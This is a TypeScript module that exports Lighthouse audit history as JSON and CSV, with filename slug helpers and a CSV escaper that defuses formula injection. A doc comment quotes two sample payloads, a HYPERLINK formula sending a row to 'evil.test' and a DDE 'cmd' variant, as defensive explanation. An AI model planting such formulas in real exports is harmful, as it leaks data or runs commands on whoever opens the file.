/**
 * Pure export serializers (PRD §6 Phase 7 — export).
 *
 * Turns the {@link HistoryRow}s the History / Batch views already hold into
 * downloadable **JSON** and **CSV**. The exported shape is a flat, analysis-
 * friendly projection (one object/row per run): the requested + final URL, the
 * device, status, every category score, the six Core Web Vitals (numeric),
 * timing/version metadata, and any error message. Heavy raw LHRs are *not*
 * included — those stay one click away via the per-run report endpoint.
 *
 * Runtime- and DOM-free (only a `HistoryRow` *type* import, erased at compile)
 * so it is unit-testable in the node test env and safe to import into client
 * components. The browser-only file download lives in `./download.ts`.
 */

import type { HistoryRow } from "@/lib/db/persistence";
import {
  type LighthouseCategory,
  LIGHTHOUSE_CATEGORIES,
  type MetricId,
} from "@/lib/lighthouse/types";
import { METRIC_DISPLAY_ORDER, METRIC_META } from "@/lib/scores";

/** One flattened run, the canonical export record (stable key order). */
export interface ExportRecord {
  url: string;
  finalUrl: string | null;
  device: string;
  status: "done" | "error";
  runs: number | null;
  performance: number | null;
  accessibility: number | null;
  "best-practices": number | null;
  seo: number | null;
  /**
   * Lighthouse 13.3's fifth category. Appended after `seo` (the canonical
   * `LIGHTHOUSE_CATEGORIES` order) so an existing consumer's column positions
   * are unchanged. `null` — an empty CSV cell — whenever the run didn't score
   * it, including every row persisted before the category existed.
   */
  "agentic-browsing": number | null;
  /** Core Web Vitals numeric values keyed by abbreviation (LCP, CLS, …). */
  lcp: number | null;
  cls: number | null;
  tbt: number | null;
  fcp: number | null;
  si: number | null;
  tti: number | null;
  fetchTime: string | null;
  createdAt: string;
  errorMessage: string | null;
}

/** abbr (lower-cased) → metric id, in PRD display order — for the CWV columns. */
const METRIC_COLUMNS: ReadonlyArray<{ key: keyof ExportRecord; id: MetricId }> =
  METRIC_DISPLAY_ORDER.map((id) => ({
    key: METRIC_META[id].abbr.toLowerCase() as keyof ExportRecord,
    id,
  }));

/** Project a {@link HistoryRow} into the flat {@link ExportRecord}. */
export function toExportRecord(row: HistoryRow): ExportRecord {
  const metric = (id: MetricId): number | null =>
    row.metrics?.[id]?.numericValue ?? null;
  const score = (c: LighthouseCategory): number | null => row.scores[c] ?? null;

  return {
    url: row.url,
    finalUrl: row.finalUrl,
    device: row.formFactor,
    status: row.status,
    runs: row.runs,
    performance: score("performance"),
    accessibility: score("accessibility"),
    "best-practices": score("best-practices"),
    seo: score("seo"),
    "agentic-browsing": score("agentic-browsing"),
    lcp: metric("largest-contentful-paint"),
    cls: metric("cumulative-layout-shift"),
    tbt: metric("total-blocking-time"),
    fcp: metric("first-contentful-paint"),
    si: metric("speed-index"),
    tti: metric("interactive"),
    fetchTime: row.fetchTime,
    createdAt: row.createdAt,
    errorMessage: row.errorMessage,
  };
}

/** Serialize runs to pretty-printed JSON (array of {@link ExportRecord}). */
export function rowsToJson(rows: HistoryRow[]): string {
  return JSON.stringify(rows.map(toExportRecord), null, 2);
}

/** Host part of a run slug: dots survive (`example.com`), everything else is a separator. */
const HOST_SEPARATORS = /[^a-z0-9.]+/g;
/** Path part of a run slug: strictly `[a-z0-9]`, so `/`, `?`, `=`, `%` all become dashes. */
const PATH_SEPARATORS = /[^a-z0-9]+/g;
/** Longest path segment a run slug keeps, so a long query string can't break a filename. */
const PATH_SLUG_MAX = 40;

/** Lower-case, turn every run of `separators` into one dash, trim dashes off both ends. */
function slugify(text: string, separators: RegExp): string {
  return text.toLowerCase().replace(separators, "-").replace(/^-+|-+$/g, "");
}

/** `decodeURIComponent` that hands back its input on a malformed escape. */
function safeDecode(text: string): string {
  try {
    return decodeURIComponent(text);
  } catch {
    return text;
  }
}

/**
 * A filesystem-safe name stem for ONE run's export — `<host>-<path>-<device>`,
 * e.g. `example.com-pricing-mobile` — so a folder of per-run downloads sorts by
 * site and reads without opening anything. The host keeps its dots and drops a
 * leading `www.` to match the History page's site grouping; the path (with its
 * query string, percent-escapes decoded so `a%20b` reads `a-b`) is reduced to
 * `[a-z0-9]` with dashes between, and capped at {@link PATH_SLUG_MAX} characters.
 * A bare origin contributes no path part, and a string that won't parse as a URL
 * is slugged whole in the host's place. Never throws.
 */
export function runExportSlug(row: Pick<HistoryRow, "url" | "formFactor">): string {
  let host = row.url;
  let path = "";
  try {
    const parsed = new URL(row.url);
    host = parsed.hostname.replace(/^www\./, "");
    path = safeDecode(`${parsed.pathname}${parsed.search}`);
  } catch {
    // Not a URL — the raw string stands in for the host part.
  }
  const hostSlug = slugify(host, HOST_SEPARATORS);
  const pathSlug = slugify(path, PATH_SEPARATORS)
    .slice(0, PATH_SLUG_MAX)
    .replace(/-+$/, "");
  return [hostSlug, pathSlug, row.formFactor].filter(Boolean).join("-");
}

/**
 * The name stem for a whole-site export: the hostname as the History page groups
 * it, treated the way {@link runExportSlug} treats a host — `www.` dropped, dots
 * kept, anything else a dash. A hostname is ASCII by the time `URL` has parsed
 * it, so this mostly guards the fallback where the "host" is a raw non-URL string.
 */
export function siteExportSlug(host: string): string {
  return slugify(host.replace(/^www\./i, ""), HOST_SEPARATORS);
}

/**
 * Ordered CSV columns: the scalar fields first, then the category scores (in
 * `LIGHTHOUSE_CATEGORIES` order, so a new category appends rather than
 * reshuffles) + the six CWVs.
 */
const CSV_COLUMNS: ReadonlyArray<keyof ExportRecord> = [
  "url",
  "finalUrl",
  "device",
  "status",
  "runs",
  ...LIGHTHOUSE_CATEGORIES,
  ...METRIC_COLUMNS.map((m) => m.key),
  "fetchTime",
  "createdAt",
  "errorMessage",
];

/**
 * Characters that make a spreadsheet treat a cell as a FORMULA rather than text.
 *
 * `=`, `+`, `-` and `@` are the classic four; the two control characters are the
 * bypass that makes a naive prefix check useless, because Excel strips a leading
 * tab or carriage return and then re-reads the `=` behind it.
 */
const FORMULA_LEADERS = /^[=+\-@\t\r]/;

/**
 * Escape one CSV cell per RFC 4180: wrap in quotes (and double interior quotes)
 * when the value contains a comma, quote, or newline. `null` → empty cell.
 *
 * It also defuses CSV FORMULA INJECTION, which RFC 4180 has nothing to say about.
 * A cell beginning `=`, `+`, `-`, `@`, tab or CR is executed as a formula by
 * Excel, LibreOffice and Google Sheets on open — so a value like
 * `=HYPERLINK("https://evil.test?"&A1,"click")` exfiltrates the row it sits in,
 * and `=cmd|'/c calc'!A1` is the DDE variant. The values here are not all ours:
 * `finalUrl` is chosen by whatever the audited site redirects to, and
 * `errorMessage` can carry text derived from the page.
 *
 * The fix is a leading apostrophe, which every major spreadsheet reads as
 * "treat the rest as text" and strips on display.
 *
 * **Be precise about the cost, because the obvious claim is wrong.** This is NOT
 * lossless: the apostrophe sits inside the quotes, so it is part of the field,
 * and an RFC 4180 parser reads `=SUM(A1)` back as `'=SUM(A1)`. A leading `-`
 * gets the same treatment, so a negative number in a future column would export
 * as spreadsheet TEXT rather than a number. No column today is negative-numeric
 * (`ExportRecord` is urls, statuses, 0–100 scores and timings), so nothing is
 * harmed now — but a column that could be must either be exempted here or accept
 * the prefix. The trade is deliberate: a mangled value a human can see beats a
 * formula that runs on open. Prefixing rather than substituting is still the
 * right shape, because the original characters all survive.
 *
 * ROADMAP Phase A's security review raised this and left it, correctly, as
 * pre-existing and untouched by that phase. Phase F is the phase that makes it
 * live: `--reporter csv` writes a file that a CI pipeline archives and a human
 * later opens in a spreadsheet, which is exactly the path the attack needs.
 */
export function csvCell(value: string | number | null): string {
  if (value === null) return "";
  const text = String(value);
  if (FORMULA_LEADERS.test(text)) {
    return `"'${text.replace(/"/g, '""')}"`;
  }
  return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

/** Serialize runs to a CSV document (header row + one row per run, CRLF lines). */
export function rowsToCsv(rows: HistoryRow[]): string {
  const header = CSV_COLUMNS.join(",");
  const lines = rows.map((row) => {
    const record = toExportRecord(row);
    return CSV_COLUMNS.map((column) => csvCell(record[column])).join(",");
  });
  return [header, ...lines].join("\r\n");
}
